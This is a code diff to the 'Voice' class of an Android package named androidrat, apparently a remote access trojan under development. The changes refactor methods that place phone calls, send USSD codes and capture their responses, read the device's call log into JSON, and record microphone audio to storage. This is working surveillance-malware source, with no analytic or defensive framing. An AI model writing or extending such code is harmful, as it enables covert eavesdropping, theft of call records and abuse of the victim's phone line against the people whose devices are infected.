@@ -3,6 +3,7 @@ package com.ot.androidrat;
 import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.net.Uri;
@@ -26,40 +27,56 @@ import java.util.TimerTask;
 public class Voice {
 
 
-    public int phoneCall(Context context, String phoneNo){
-        try{
+    public static int phoneCall(Context context, String phoneNo) {
+        try {
             Intent callIntent = new Intent(Intent.ACTION_CALL);
             callIntent.setData(Uri.parse("tel:" + phoneNo));
             context.startService(callIntent);
-        }catch(Exception ex){
+        } catch (Exception ex) {
             return 1;
         }
         return 0;
     }
-    
-    public void disalUSSD(String ussd, Context context){
-        if(ussd.equalsIgnoreCase("")){
-            return;
+
+    public static String dialUSSD(String ussd, Context context) {
+        StringBuilder result = new StringBuilder();
+        if (ussd.equalsIgnoreCase("")) {
+            return "No USSD code supplied";
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                // TODO: Consider calling
+                //    ActivityCompat#requestPermissions
+                // here to request the missing permissions, and then overriding
+                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                //                                          int[] grantResults)
+                // to handle the case where the user grants the permission. See the documentation
+                // for ActivityCompat#requestPermissions for more details.
+                return "Permission not granted";
+            }
             manager.sendUssdRequest(ussd, new TelephonyManager.UssdResponseCallback() {
                 @Override
                 public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                     super.onReceiveUssdResponse(telephonyManager, request, response);
-                    Log.i("ussd",response.toString().trim());
+                    result.append(response.toString().trim());
+                    Log.i("ussd", response.toString().trim());
                 }
 
                 @Override
                 public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                     super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
+                    result.append(failureCode + " " + request);
                     Log.i("ussd", failureCode + " " + request);
                 }
             }, new Handler());
+        }else {
+            return "API level not supported";
         }
+        return result.toString();
     }
 
-    public JSONObject viewCallLog(Context context) {
+    public static JSONObject readCallLog(Context context) {
         JSONObject Calls = null;
         try {
             Calls = new JSONObject();
@@ -92,7 +109,7 @@ public class Voice {
         return Calls;
     }
 
-    public void recordMic(){
+    public static void recordMic(){
         MediaRecorder recorder;
         String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".mp3";
         File audiofile = new File(mPath);
